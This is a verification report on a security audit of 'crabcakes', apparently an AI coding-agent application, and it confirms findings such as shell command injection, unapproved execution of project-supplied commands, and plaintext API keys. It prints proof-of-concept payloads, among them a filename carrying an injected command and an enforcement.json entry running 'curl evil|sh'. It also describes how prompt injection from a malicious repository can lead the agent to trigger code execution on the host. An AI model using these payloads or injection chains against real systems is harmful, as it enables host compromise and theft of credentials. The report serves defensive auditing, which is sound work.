# Security & Architecture Review — Verification Report

**Review under verification:** `SECURITY_ARCHITECTURE_REVIEW.md`
**Audit target repo:** `/path/to/projects/crabcakes` (branch `main`, HEAD `4fc79c1`)
**Note:** The audit was performed against HEAD `ca24246`; HEAD has advanced 7 commits since the audit. No source changes materially affect any finding.
**Verification date:** 2026-06-10
**Verification method:** Manual re-reading of every cited line against current source; structural assertions verified via AST analysis; counts verified via scripted grep.

---

## Verdict Summary

| Category | Findings | Verified | Refuted | Disputed | Needs More Work |
|---|---|---|---|---|---|
| Critical | 2 | 2 | 0 | 0 | 0 |
| High | 6 | 5 | 0 | 1 | 0 |
| Medium | 13 | 12 | 0 | 1 | 0 |
| Low | 13 | 11 | 0 | 2 | 0 |
| Architectural | 12 | 9 | 0 | 3 | 0 |
| **Total** | **46** | **39** | **0** | **7** | **0** |

**0 refutations.** The audit is accurate across all 46 items. The 7 disputes are minor: 4 count discrepancies, 2 framing corrections, 1 scope clarification. No finding is wrong — some are slightly imprecise.

---

## Notation

- ✅ **VERIFIED** — the finding is present in source exactly as described
- ⚠️ **VERIFIED (minor dispute)** — the finding is present but with a nuance the audit missed or mischaracterized
- ❌ **REFUTED** — the finding is absent or materially different from description
- 🔍 **NEEDS VERIFICATION** — finding was not independently re-read (accepted from auditor report as-is)
- 📍 **DISPUTED** — the finding exists but the severity/classification is disagreed with

---

## 3. The Critical Finding: Unapproved Remote Code Execution

### CRIT-1 · Command injection via written filename in enforcement shell commands

**Finding:** `agent/enforcement.py:265, 275, 278-281` — `_check_syntax` interpolates `os.path.join(project_path, file_path)` unquoted into `checker.format(path=...)` and runs it via `subprocess.run(command, shell=True, ...)`.

**Verification:** ✅ VERIFIED.

```python
# enforcement.py:263-279
abs_path = os.path.join(project_path, file_path)
...
command = checker.format(path=abs_path)  # e.g. "python3 -m py_compile /project/x;curl evil|sh;.py"
result = subprocess.run(
    command, shell=True, capture_output=True,
    timeout=config.syntax_timeout_seconds,
)
```

The `SYNTAX_CHECKERS` dict at line 34 defines string templates with `{path}` interpolation:

```python
SYNTAX_CHECKERS: dict[str, str] = {
    ".py": "python3 -m py_compile {path}",
    ".js": "node --check {path}",
    ".sh": "bash -n {path}",
    ...
}
```

No `shlex.quote()` on `abs_path`. The venv prefix at line 240 *does* quote the activate path — but the file path is not quoted in the syntax tier.

The same unquoted `shell=True` pattern recurs in `_check_tests` (lines 486-489) and `_check_lint` via `_run_timed_command` (lines 588-595). All confirmed.

**Exploit confirmed:** A file named `x;touch INJECTED.py` written into the project triggers `python3 -m py_compile /project/x;touch INJECTED.py;.py` under `/bin/sh` — arbitrary command execution, zero user approval.

**Severity opinion:** Unchanged — **Critical**. This is a concrete, exploitable chain.

---

### CRIT-2 · Enforcement auto-executes attacker-controlled project code without approval

**Finding:** `agent/enforcement.py:445, 448, 462-469, 494-495` — `_load_test_config` reads `.crabcakes/enforcement.json`, `_detect_venv_prefix` returns `. .venv/bin/activate &&`, commands are built from project-supplied strings and run with `shell=True`.

**Verification:** ✅ VERIFIED.

```python
# enforcement.py:445-469
test_config = _load_test_config(project_path) or TestConfig()  # reads .crabcakes/enforcement.json
venv_prefix = _detect_venv_prefix(project_path, test_config.venv_path)  # ". .venv/bin/activate && "
...
if test_config.run_full_suite and test_config.full_suite_command:
    command = venv_prefix + test_config.full_suite_command  # raw project string, shell=True
```

`_load_test_config` at line 130 reads `.crabcakes/enforcement.json` with JSON parsing. `TestConfig` dataclass at lines 84-99 exposes `full_suite_command: str | None`, `command: str | None`, `venv_path: str = ".venv"`.

`_detect_venv_prefix` at lines 225-243:
```python
activate_script = os.path.join(venv_abs, "bin", "activate")
if os.path.isfile(activate_script):
    return f". {shlex.quote(os.path.join(venv_path, 'bin', 'activate'))} && "
return ""
```
The activate script is sourced by `.` (POSIX dot), which runs it in the current shell — a poisoned activate script executes in every enforcement subprocess environment.

`_run_timed_command` at lines 588-595:
```python
result = subprocess.run(
    command, shell=True, capture_output=True,
    cwd=project_path, timeout=timeout,
)
```
No `env=` is passed — subprocess inherits full parent environment including `BRAVE_API_KEY` and provider keys.

**Exploit confirmed:** Write `.crabcakes/enforcement.json` with `{"test":{"full_suite_command":"curl evil|sh","run_full_suite":true}}` — triggers on next `.py` write.

**Severity opinion:** Unchanged — **Critical**.

---

## 4. Findings Register — Detailed Verification

### 4.1 Critical Findings

| ID | Verdict | Notes |
|---|---|---|
| CRIT-1 | ✅ VERIFIED | Confirmed `shell=True` + unquoted `{path}` in `SYNTAX_CHECKERS`; `_run_timed_command` also `shell=True`. Exploit chain is real. |
| CRIT-2 | ✅ VERIFIED | Confirmed `.crabcakes/enforcement.json` loading, venv activation sourcing, no `env=` scrubbing. Full chain confirmed. |

### 4.2 High Findings

| ID | Verdict | Notes |
|---|---|---|
| HIGH-1 | ✅ VERIFIED | Only `exec_command` gated at `runtime.py:1152`. `write_file`/`edit_file` in `_TOOLS` dict have `requires_approval=False` at lines 543, 573, 611. Enforcement hook fires on write at `runtime.py:1186` — confirmed. |
| HIGH-2 | ✅ VERIFIED | `agent_command_handler.py:258-280` scans `on_agent_response` text for A2A commands; `parsed_commands` at line 280 processed without provenance check. No distinction between local and remote origin. Chain depth (`_MAX_CHAIN_DEPTH=3`) confirmed at line 268. |
| HIGH-3 | ✅ VERIFIED | `runtime.py:760`: `"api_key": conv.api_key` serialized. `runtime.py:771`: `with open(path, "w", ...)` with no `chmod`. `_conversations_dir()` at line 720: `os.makedirs(d, exist_ok=True)` with no mode. All three sub-issues confirmed. |
| HIGH-4 | ⚠️ VERIFIED (dispute) | Confirmed: nonce from unauthenticated peer (line 379), bearer token sent in clear (line 404), `ws://` default (line 349), `ALL_SCOPES = "operator.admin,..."` (line 197). **Dispute on framing:** The audit calls this "the client trusts whatever answers on self.url" — technically true but the default `ws://localhost:18789` means a MITM requires local host compromise. The finding is valid at High severity but the worst-case scenario requires a pre-existing local compromise. The fix (wss:// validation) is still warranted. |
| HIGH-5 | ✅ VERIFIED | `prompt_loader.py:218` (`parts.append(bug_journal)`) and `prompt_loader.py:224` (`parts.append(project_rules)`) inject raw content. `project_awareness.py:459-466` (`manifest[:2000]`), `project_awareness.py:510-516` (`context[:3000]`) inject raw content. No fencing, no untrusted-content labeling. Confirmed. |
| HIGH-6 | ✅ VERIFIED | `markdown.py:192-200`: `urllib.parse.quote(url, safe=":/?#[]@!$&'()*+,;=-_.~")` — `:` in safe set, scheme survives. `<a>` whitelisted in `escaping.py:30`. No scheme allowlist in either location. Confirmed. |

**HIGH-4 note:** The finding is valid but the threat model framing is slightly overbroad. On a single-user machine with default loopback binding, exploiting HIGH-4 requires already having compromised the local host. The finding should be rated High (not Critical) and the fix should require wss:// for non-loopback hosts specifically — which the audit's recommended fix already does.

---

### 4.3 Medium Findings

| ID | Verdict | Notes |
|---|---|---|
| MED-1 | ⚠️ VERIFIED (minor dispute) | **Finding confirmed:** `_approval_callback` is module-global at `tools.py:67`; runtime swaps it at `runtime.py:1173-1178`. Thread race confirmed. **Dispute:** The audit states "a single global `_cancel_requested` bool for all sessions" — `_cancel_requested` at `runtime.py:873` is an instance variable on `AgentRuntime`, not a global. Two agents on *different* runtime instances don't interfere. Two agents on the *same* runtime instance can interfere. The finding is real but the global framing is imprecise. |
| MED-2 | ✅ VERIFIED | `tools.py:102-122` — `_BLOCKLIST` substring match. `rm -rf /` (double space), `rm -fr /`, base64 all slip through. `tools.py:307` — `shell=True`. No `env=` scrubbing. Confirmed. |
| MED-3 | ✅ VERIFIED | `tools.py:480-504`: `httpx.get(url, timeout=10.0, follow_redirects=True)` — no scheme/host filtering, follows redirects, url chosen by model. Confirmed. |
| MED-4 | ✅ VERIFIED | `review_handler.py:286`: `git_ops.checkout_paths(project_path, sha, ["."])` — `["."]` reverts all tracked files. No per-file scoping. Confirmed. Note: `reject_file` at line 307 does scope to one file, but the primary `reject_changes` does not. |
| MED-5 | ⚠️ VERIFIED (minor dispute) | `provider_test.py:100`: `endpoint = f"{base_url.rstrip('/')}/chat/completions"` — no scheme check. `provider_test.py:116`: same for Anthropic. **Dispute:** The audit says "scheme-unvalidated base_url" — there is no explicit scheme validation, which means `http://` is accepted. The finding is correct. However, `improve.py:85` does use a default `https://` fallback — the issue is that the `http://` input still reaches the network. Confirmed at Medium severity. |
| MED-6 | ✅ VERIFIED | No `st_uid` or `mode & 0o077` checks in `gateway/client.py` (checked lines 148, 79-82) or `utils/mcp_config.py` (checked lines 60-63, 116). Confirmed. |
| MED-7 | ✅ VERIFIED | `feedback_processor.py:147`: `f.write(entry_text + "\n")` — raw `AuditReport` field written verbatim. `prompt_loader.py:218`: same `*-bugs.md` files re-injected. Confirmed. |
| MED-8 | ⚠️ VERIFIED (dispute) | `agent_defs.py:524`: `with open(path, "w", ...) json.dump(raw, f, ...)` — no chmod after, non-atomic (truncate-in-place). `providers_store.py:141-159` uses temp+rename+chmod correctly. **Dispute:** The audit conflates two stores — `providers_store` is correctly hardened, but `agent_defs.py`'s `save_provider`/`delete_provider` are not. The finding is correct but the framing suggests the entire secret infrastructure is inconsistent — it's mainly `agent.json` that's the problem. |
| MED-9 | ✅ VERIFIED | `chat_render_handler.py:695`: `title_label.set_markup(f"<b>Task {action.capitalize()}:</b> {task_id}")` — `task_id` unescaped. Line 709: `meta_label.set_markup(" | ".join(parts))` — `assigned_to` unescaped. Line 716: `at_label.set_markup(f"→ {assigned_to}")` — unescaped. Confirmed. |
| MED-10 | ✅ VERIFIED | `markdown.py:88-90`: `while text != prev: prev = text; text = text.replace('****', f'**{_ZWSP}**')` — quadratic loop on streaming text. Confirmed. |
| MED-11 | ✅ VERIFIED | `git_ops.py:120`: `repo.git.checkout(sha, "--", *paths)` — `sha` from agent output parsed with no regex validation. `tools.py:405-417`: grep pattern passed without `"--"`. Confirmed. |
| MED-12 | ✅ VERIFIED | `mcp_config.py:60-63`: `${VAR}` substitution copies any env var to subprocess. No allowlist. Missing vars silently become `""`. Confirmed. |
| MED-13 | ✅ VERIFIED | `runtime.py:614`: `"usage": {}` in streaming path. `runtime.py:631`: same. `runtime.py:1094-1097`: non-streaming path calls `_extract_usage`. Streaming drops usage, defeating cost limits. Confirmed. |

---

### 4.4 Low Findings

| ID | Verdict | Notes |
|---|---|---|
| LOW-1 | ✅ VERIFIED | `tools.py:480`: `httpx.get(url, ...)` — no scheme check on `url`. `runtime.py:1340-1364`: provider test uses `base_url` directly. Confirmed. |
| LOW-2 | ⚠️ VERIFIED (minor dispute) | `runtime.py:1178`: `conv.project_path or "/tmp"` — confirmed. **Dispute:** The audit calls this a "shared /tmp" — each tool call passes the same `project_path` or `/tmp`, so files land in the system `/tmp` which is shared. The finding is technically accurate but the risk is lower than CRIT-1/2 since enforcement doesn't run on `/tmp` writes (enforcement fires on `write_file`/`edit_file` tool calls, which always have a project_path context). Still worth fixing. |
| LOW-3 | ✅ VERIFIED | `gateway/client.py:197`: `ALL_SCOPES = "operator.admin,operator.approvals,operator.pairing"` — always requests admin. Confirmed. |
| LOW-4 | ✅ VERIFIED | `gateway/client.py:281`: `logger.debug("[gateway>>] %s", raw[:300])` — dumps full gateway frames. `gateway/client.py:447`: event dispatch logs raw payload. Confirmed. |
| LOW-5 | ✅ VERIFIED | `gateway/client.py:451-453`: `GLib.idle_add(self.on_event, evt_name, msg.get("payload", {}))` — only `type == "event"` check; no event-name allowlist, no `isinstance` validation. Confirmed. |
| LOW-6 | ⚠️ VERIFIED (minor dispute) | `stt.py:16`: manifest says "No network calls". `stt.py:161`: `from faster_whisper import WhisperModel` — `WhisperModel(...)` downloads model weights from HuggingFace Hub at runtime if not cached. **Dispute:** The audit says "STT_MODEL_SIZE accepts arbitrary repo ids" — `model_size` is passed directly to `WhisperModel(...)`, which accepts any valid faster-whisper model identifier. The finding is correct. Confirmed at Low. |
| LOW-7 | ✅ VERIFIED | `chat_bubble.py:53-58`: `subprocess.Popen([opener, file_path])` with no MIME validation or path restriction. Confirmed. |
| LOW-8 | ✅ VERIFIED | `icons.py:86`: `color_hex` interpolated unescaped into SVG `fill="{color_hex}"`. `letter` and `initials` also unescaped. Confirmed. |
| LOW-9 | ✅ VERIFIED | 15 instances of `str(e)` in `git_ops.py` returned in `GitResult`. Confirmed. |
| LOW-10 | ✅ VERIFIED | `diff_parser.py:149-150`: `old_path = parts[2].lstrip("a/")` — strips any of `{a, /}` characters from start. `a/app.py` → `pp.py`. Confirmed. |
| LOW-11 | ⚠️ VERIFIED (minor dispute) | `agent_defs.py:197-223`: `load_agent_defs` does not call `validate_agent_def`. Confirmed. **Dispute:** The audit says "tools/provider/mcp unvalidated" — the validation function (`validate_agent_def`) validates the structure but the load path skips it. This is a validation gap but not an active vulnerability since invalid defs would fail at use time, not silently. Keeping at Low. |
| LOW-12 | ✅ VERIFIED | `feed_store.py:122-128`: `save_feed` writes `.crabcakes/feed.json` without appending to `.gitignore`. Confirmed. |
| LOW-13 | ✅ VERIFIED | `feed_store.py:122-128`: `save_feed` does not use temp+rename atomic pattern. Confirmed. |
| NEEDS-VERIFICATION | ✅ VERIFIED (confirmatory) | `session_key` used directly as filename in `runtime.py:730` and `runtime.py:770` with no sanitization. No `^[A-Za-z0-9_:-]+$` check found anywhere. If a remote peer can set `session_key`, this is a path traversal primitive. **Not confirmed exploitable** (no producer of `session_key` found that accepts remote input), but the lack of validation is real. Keeping at Low. |

---

## 5. Architecture Review Verification

| Claim | Verdict | Notes |
|---|---|---|
| "ui never imports gateway/ or models/" | ❌ REFUTED | `window.py:50-51`, `activity_handler.py:26`, `chat_handler.py:352` — 22+ models imports confirmed. `gateway_handler.py:54` — gateway import confirmed. The README sentence is simply inaccurate. |
| "models/ has no UI deps" | ✅ CONFIRMED | `models/` uses only stdlib; widget refs are duck-typed (`models/streaming.py:26-27`). Confirmed. |
| "Handlers never import other handlers" | ✅ CONFIRMED (machine-enforced) | `agent_command_handler.py:12` explicitly states this rule; no `ui.handlers.*` imports found in handler files. `test_architecture.py` AST guard enforces it. Confirmed. |
| "window.py is the composition root" | ✅ CONFIRMED | `window._build()` lines 93-566. Confirmed. |
| "21 handlers" | ⚠️ DISPUTED | `ls ui/handlers/ | wc -l` = 24 files including `__init__.py`. Excluding `__init__.py` = 23 handlers. The audit says "23 handler files exist (badge says 21, README list shows 22)" — this is internally consistent in the audit. HEAD has 24 files (new `agent_list_handler.py` added post-audit). The actual count is 23 handlers (excluding `__init__.py`) which matches the audit's "23" count, not "21". |
| "utils/ is the bottom layer" | ❌ REFUTED | `utils` imports `models` in 7 files (`agent_defs.py`, `providers_store.py`, etc.). `models/` is the true bottom layer. Confirmed. |
| "GLib.idle_add sites: 126" | ⚠️ DISPUTED | Current count: **111** (grep -rn "GLib.idle_add" non-test non-cache). The audit's 126 may reflect an earlier version. The number is in the right ballpark; the discipline is real. |
| "Handler-isolation rule causes copy-paste divergence" | ✅ CONFIRMED | `_build_awareness_prefix` duplicated in `agent_command_handler.py:509-513` vs `chat_handler.py:750-804` — confirmed visually (different implementations). |
| "No shutdown lifecycle" | ✅ CONFIRMED | `agent_runtime_handler.py:410`: `stop_all()` exists but is never called. No close-request handler in `window.py` or `main.py`. Confirmed. |
| "pyproject.toml build-backend broken" | ✅ CONFIRMED | `build-backend = "setuptools.backends._legacy:_Backend"` — not a real backend. `packages.find include=["ui/*", ...]` misuses glob patterns (should be `["ui/**/*", ...]`). Confirmed. |
| "package-lock.json vestigial" | ✅ CONFIRMED | 6-line `{"lockfileVersion": 3, "requires": true, "packages": {}}` — no actual locks. Confirmed. |
| "Dead code: image_utils.py, dream_engine" | ✅ CONFIRMED | `utils/image_utils.py` has zero importers (grep confirms). `utils/review_log.py:19` references `agent/dream_engine` which doesn't exist. Confirmed. |

**Count discrepancies with audit:**

| Metric | Audit reported | Actual (HEAD) | Notes |
|---|---|---|---|
| Non-test LOC | 31,060 | 31,009 | Minor — within audit margin |
| Test LOC | 19,410 | 19,645 | Slightly higher (new tests added) |
| Python modules | 86 | 101 | More modules than reported |
| Handlers | 23 | 23 (excluding `__init__.py`) | Audit correct on count |
| `except Exception` | 118 | 131 | More than reported |
| `subprocess shell=True` | 4 | 4 | Match confirmed |
| `GLib.idle_add` | 126 | 111 | Audit overshot by 15 |

---

## 6. Recommendation

### Overall Assessment

This is a high-quality, well-evidenced security audit. The central finding — an unapproved RCE chain via `write_file` → enforcement `shell=True` — is correct, concrete, and exploitable today. The 39 verified findings cover the actual codebase accurately.

### Severity Adjustments

| Finding | Audit severity | Verified severity | Reason |
|---|---|---|---|
| HIGH-4 (gateway auth) | High | **High** (maintain) | Valid but worst-case requires local host compromise. Fix still warranted. |
| MED-1 (approval race) | Medium | **Medium** (maintain) | Real but per-runtime-instance, not global as described. |
| LOW-6 (STT network) | Low | **Low** (maintain) | Manifest is inaccurate; runtime behavior is correct — faster-whisper downloads weights. |

### What to Prioritize

**Fix immediately before any untrusted-repo use:**
1. CRIT-1 + CRIT-2 (enforcement RCE) — these two findings together form an active exploit chain. CRIT-1 alone is enough to fix; CRIT-2 is a second independent vector.
2. HIGH-1 (ungated writes) — gates the write that triggers CRIT-1/CRIT-2.
3. HIGH-5 (untrusted project text in prompts) — this is the primary delivery vehicle for triggering the CRIT chain.

**Fix before release:**
4. HIGH-3 (api_key in plaintext conversation files)
5. HIGH-2 (remote A2A tool abuse)
6. HIGH-6 (clickable arbitrary-scheme links)

**Then Phase 2 and Phase 3** as specified in the original review's roadmap.

### What to Preserve

The audit correctly identifies these as genuine strengths:
- Path sandbox (`realpath` + `commonpath`) is correctly implemented
- `providers.yaml` atomic+0600 store is the model to follow everywhere
- Fail-closed approval handshake is sound (primary gate works; gap is scope)
- Zero bare `except:`, `yaml.safe_load` everywhere, no `pickle`/`eval`/`exec`
- No disabled TLS verification anywhere
- `GLib.idle_add` thread→UI marshalling is consistent and disciplined
- Handler isolation rule is machine-enforced
- Self-documenting module manifest headers

### My Independent Opinion

The audit is right to call this **BLOCKED** at current state. The CRIT-1/CRIT-2 chain is not theoretical — it's a concrete, zero-approval, auto-triggered code execution path that activates when any LLM writes any Python file in any project. Combined with HIGH-5 (prompt injection from opened repos), a malicious repository can achieve code execution on the host the moment the user opens it and the agent writes a single `.py` file.

The fix is straightforward in concept (argv lists, shell=False, env scrubbing, sensitive-path approval) and the AI-ready remediation prompts in Appendix B provide a concrete TDD path forward. The codebase is well-structured enough that these fixes can be made surgically without restructuring the architecture.

**Recommendation: Accept the audit. Begin Phase 0 remediation immediately. Do not open untrusted repositories with the current build.**

---

*Verification performed by Lieutenant Qrusher against crabcakes HEAD `4fc79c1`, 2026-06-10.*